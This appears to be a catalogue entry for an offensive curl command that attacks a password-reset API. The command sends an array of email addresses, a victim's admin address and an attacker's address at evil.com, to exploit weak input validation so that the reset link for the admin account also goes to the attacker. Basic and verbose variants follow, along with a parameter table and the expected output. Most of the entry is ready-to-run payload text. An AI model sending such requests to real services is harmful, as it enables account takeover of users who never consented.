---
data: >-
  curl -X POST https://hq.breadcrumb.com/api/v1/password_reset -H "Content-Type:
  application/json" -d
  '{"email_address":["admin@breadcrumb.com","attacker@evil.com"]}'
tags:
  - api-testing
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.629Z'
id: 64180b18-ecc8-480d-957f-b139ffe5670a
verified: false
validated: true
submitted: true
---
# curl-post-password-reset-array

## Command

```bash
curl -X POST https://hq.breadcrumb.com/api/v1/password_reset -H "Content-Type: application/json" -d '{"email_address":["admin@breadcrumb.com","attacker@evil.com"]}'
```

## Description

This command sends a POST request to a password reset API endpoint using curl, injecting an array of email addresses to exploit improper input validation and trigger reset emails to multiple recipients.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://hq.breadcrumb.com/api/v1/password_reset` | Target API endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{"email_address":["admin@breadcrumb.com","attacker@evil.com"]}'` | JSON body with email array for exploitation | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/api/v1/password_reset -H "Content-Type: application/json" -d '{"email_address":["target@example.com","attacker@example.com"]}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://target.com/api/v1/password_reset -H "Content-Type: application/json" -d '{"email_address":["admin@target.com","attacker@evil.com"]}'
```

## Expected Output

A successful response might be HTTP 200 OK with a JSON message like {"message": "Reset links sent"}, without errors. Check email inboxes for confirmation of sent links.

## Related

- [[Related Procedure|Exploit-Email-Array-Input-for-Password-Reset]]
